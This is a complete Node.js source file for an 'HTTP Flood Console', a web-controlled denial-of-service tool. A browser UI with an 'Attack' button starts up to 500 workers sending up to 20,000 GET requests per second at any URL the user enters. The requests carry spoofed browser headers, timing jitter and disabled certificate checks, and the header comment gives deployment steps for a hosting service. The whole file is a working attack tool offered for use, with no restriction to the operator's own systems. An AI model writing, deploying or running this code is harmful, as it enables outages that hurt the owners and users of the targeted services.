#!/usr/bin/env node
/**
 * HTTP Flood Console — web UI + real Node flood
 * Render start: node ddos_flood.js
 * Open the service URL → paste target → Attack
 */

"use strict";

const http  = require("http");
const https = require("https");
const { URL } = require("url");
const { performance } = require("perf_hooks");

const PORT = process.env.PORT || 3000;

// ── flood state ───────────────────────────────────────────────────────
let flood = {
  running: false,
  target: "",
  workers: 64,
  rps: 1500,
  sent: 0,
  ok: 0,
  err: 0,
  bytes: 0,
  startTs: 0,
  agent: null,
  timers: [],
  abort: false
};

function stopFlood() {
  flood.abort = true;
  flood.running = false;
  if (flood.agent) {
    try { flood.agent.destroy(); } catch (_) {}
    flood.agent = null;
  }
  flood.timers.forEach(t => clearTimeout(t));
  flood.timers = [];
}

function startFlood(target, workers, rps) {
  stopFlood();
  flood.abort = false;
  flood.running = true;
  flood.target = target;
  flood.workers = workers;
  flood.rps = rps;
  flood.sent = 0;
  flood.ok = 0;
  flood.err = 0;
  flood.bytes = 0;
  flood.startTs = performance.now();

  let parsed;
  try {
    parsed = new URL(target);
  } catch (e) {
    flood.running = false;
    return { error: "invalid url" };
  }

  const isHttps = parsed.protocol === "https:";
  const host = parsed.hostname;
  const port = parsed.port ? parseInt(parsed.port, 10) : (isHttps ? 443 : 80);
  const path = (parsed.pathname + parsed.search) || "/";
  const lib = isHttps ? https : http;
  const Agent = isHttps ? https.Agent : http.Agent;

  flood.agent = new Agent({
    keepAlive: true,
    maxSockets: workers * 2,
    maxFreeSockets: workers,
    timeout: 10000,
    scheduling: "lifo"
  });

  const delayMs = Math.max(1, (workers * 1000) / rps);

  function fireOne() {
    if (flood.abort) return;

    const headers = {
      "Host": host,
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "Accept": "*/*",
      "Accept-Encoding": "identity",
      "Connection": "keep-alive",
      "Cache-Control": "no-cache"
    };

    const opts = {
      hostname: host,
      port,
      path,
      method: "GET",
      headers,
      agent: flood.agent,
      timeout: 8000,
      rejectUnauthorized: false
    };

    const req = lib.request(opts, (res) => {
      flood.sent++;
      if (res.statusCode >= 200 && res.statusCode < 500) flood.ok++;
      else flood.err++;
      res.on("data", (c) => { flood.bytes += c.length; });
      res.resume();
    });

    req.on("error", () => {
      flood.sent++;
      flood.err++;
    });
    req.on("timeout", () => {
      req.destroy();
      flood.sent++;
      flood.err++;
    });
    req.end();
  }

  function worker() {
    if (flood.abort) return;
    fireOne();
    const jitter = (Math.random() - 0.5) * delayMs * 0.2;
    const t = setTimeout(worker, delayMs + jitter);
    flood.timers.push(t);
  }

  for (let i = 0; i < workers; i++) {
    const t = setTimeout(worker, i * 3);
    flood.timers.push(t);
  }

  return { ok: true };
}

// ── html ui ───────────────────────────────────────────────────────────
const HTML = `<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Flood Console</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:system-ui,sans-serif;background:#0b0e14;color:#e6edf3;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .box{width:100%;max-width:480px;background:#12161f;border:1px solid #1f2733;border-radius:12px;padding:24px}
  h1{font-size:1.2rem;margin-bottom:4px}
  .sub{font-size:.8rem;color:#8b949e;margin-bottom:20px}
  label{display:block;font-size:.75rem;color:#8b949e;margin-bottom:6px;text-transform:uppercase;letter-spacing:.05em}
  input{width:100%;background:#0b0e14;border:1px solid #30363d;border-radius:8px;color:#e6edf3;padding:10px 12px;font-size:.95rem;margin-bottom:14px;outline:none}
  input:focus{border-color:#58a6ff}
  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
  .btns{display:flex;gap:10px;margin-top:6px}
  button{flex:1;border:none;border-radius:8px;padding:12px;font-size:.95rem;font-weight:600;cursor:pointer}
  #go{background:#da3633;color:#fff}
  #stop{background:#21262d;color:#e6edf3;border:1px solid #30363d}
  button:disabled{opacity:.4;cursor:not-allowed}
  .stats{margin-top:20px;padding-top:16px;border-top:1px solid #21262d;font-family:ui-monospace,monospace;font-size:.85rem;line-height:1.7}
  .stats b{color:#58a6ff}
  .led{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px;background:#8b949e}
  .led.on{background:#3fb950;box-shadow:0 0 8px #3fb950}
  .led.off{background:#da3633}
  .log{margin-top:12px;max-height:120px;overflow-y:auto;background:#0b0e14;border-radius:8px;padding:10px;font-size:.75rem;color:#8b949e;font-family:ui-monospace,monospace}
</style>
</head>
<body>
<div class="box">
  <h1>HTTP Flood Console</h1>
  <p class="sub">target 넣고 Attack → 실제 소켓 flood</p>

  <label>target url</label>
  <input id="url" type="text" placeholder="https://example.com" value="">

  <div class="row">
    <div>
      <label>workers</label>
      <input id="workers" type="number" min="1" max="500" value="64">
    </div>
    <div>
      <label>rps</label>
      <input id="rps" type="number" min="1" max="20000" value="1500">
    </div>
  </div>

  <div class="btns">
    <button id="go">Attack</button>
    <button id="stop" disabled>Stop</button>
  </div>

  <div class="stats">
    <div><span class="led" id="led"></span>state: <b id="state">idle</b></div>
    <div>sent: <b id="sent">0</b></div>
    <div>ok / err: <b id="ok">0</b> / <b id="err">0</b></div>
    <div>elapsed: <b id="elapsed">0.0</b>s</div>
    <div>rps: <b id="currps">0</b></div>
  </div>
  <div class="log" id="log"></div>
</div>

<script>
const $ = id => document.getElementById(id);
let poll = null;
let lastSent = 0, lastTs = 0;

function log(m){
  const d = document.createElement("div");
  d.textContent = "[" + new Date().toLocaleTimeString() + "] " + m;
  $("log").prepend(d);
  while($("log").children.length > 30) $("log").lastChild.remove();
}

async function api(path, body){
  const opt = body ? {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body)} : {};
  const r = await fetch(path, opt);
  return r.json();
}

function setUi(on){
  $("go").disabled = on;
  $("stop").disabled = !on;
  $("led").className = "led " + (on ? "on" : "off");
  $("state").textContent = on ? "flooding" : "stopped";
}

async function refresh(){
  try{
    const s = await api("/status");
    $("sent").textContent = s.sent;
    $("ok").textContent = s.ok;
    $("err").textContent = s.err;
    $("elapsed").textContent = s.elapsed;
    const now = Date.now();
    if(lastTs){
      const dt = (now - lastTs) / 1000;
      if(dt > 0) $("currps").textContent = Math.round((s.sent - lastSent) / dt);
    }
    lastSent = s.sent;
    lastTs = now;
    if(!s.running){
      clearInterval(poll);
      poll = null;
      setUi(false);
    }
  }catch(e){}
}

$("go").onclick = async () => {
  let url = $("url").value.trim();
  if(!url){ log("url 비어있음"); return; }
  if(!/^https?:\\/\\//i.test(url)) url = "https://" + url;
  const workers = Math.max(1, Math.min(500, parseInt($("workers").value,10)||64));
  const rps = Math.max(1, Math.min(20000, parseInt($("rps").value,10)||1500));
  const res = await api("/start", {url, workers, rps});
  if(res.error){ log(res.error); return; }
  log("start → " + url + " w=" + workers + " rps=" + rps);
  setUi(true);
  lastSent = 0; lastTs = Date.now();
  if(poll) clearInterval(poll);
  poll = setInterval(refresh, 500);
};

$("stop").onclick = async () => {
  await api("/stop", {});
  log("stopped");
  setUi(false);
  if(poll) clearInterval(poll);
  poll = null;
  refresh();
};
</script>
</body>
</html>`;

// ── http server ───────────────────────────────────────────────────────
const server = http.createServer((req, res) => {
  const u = new URL(req.url, "http://localhost");

  // CORS for safety if opened from elsewhere
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === "GET" && (u.pathname === "/" || u.pathname === "/index.html")) {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(HTML);
    return;
  }

  if (req.method === "GET" && u.pathname === "/status") {
    const elapsed = flood.running ? ((performance.now() - flood.startTs) / 1000).toFixed(1) : "0.0";
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({
      running: flood.running,
      target: flood.target,
      sent: flood.sent,
      ok: flood.ok,
      err: flood.err,
      bytes: flood.bytes,
      elapsed
    }));
    return;
  }

  if (req.method === "POST" && u.pathname === "/start") {
    let body = "";
    req.on("data", c => body += c);
    req.on("end", () => {
      try {
        const j = JSON.parse(body || "{}");
        let url = (j.url || "").trim();
        if (!url) {
          res.writeHead(400, { "Content-Type": "application/json" });
          res.end(JSON.stringify({ error: "url required" }));
          return;
        }
        if (!/^https?:\/\//i.test(url)) url = "https://" + url;
        const workers = Math.max(1, Math.min(500, parseInt(j.workers, 10) || 64));
        const rps = Math.max(1, Math.min(20000, parseInt(j.rps, 10) || 1500));
        const result = startFlood(url, workers, rps);
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify(result));
      } catch (e) {
        res.writeHead(400, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ error: "bad json" }));
      }
    });
    return;
  }

  if (req.method === "POST" && u.pathname === "/stop") {
    stopFlood();
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  res.writeHead(404);
  res.end("not found");
});

server.listen(PORT, () => {
  console.log(`[flood] listening on :${PORT}`);
  console.log(`[flood] open the service URL → paste target → Attack`);
});

process.on("SIGINT", () => {
  stopFlood();
  process.exit(0);
});
process.on("SIGTERM", () => {
  stopFlood();
  process.exit(0);
});
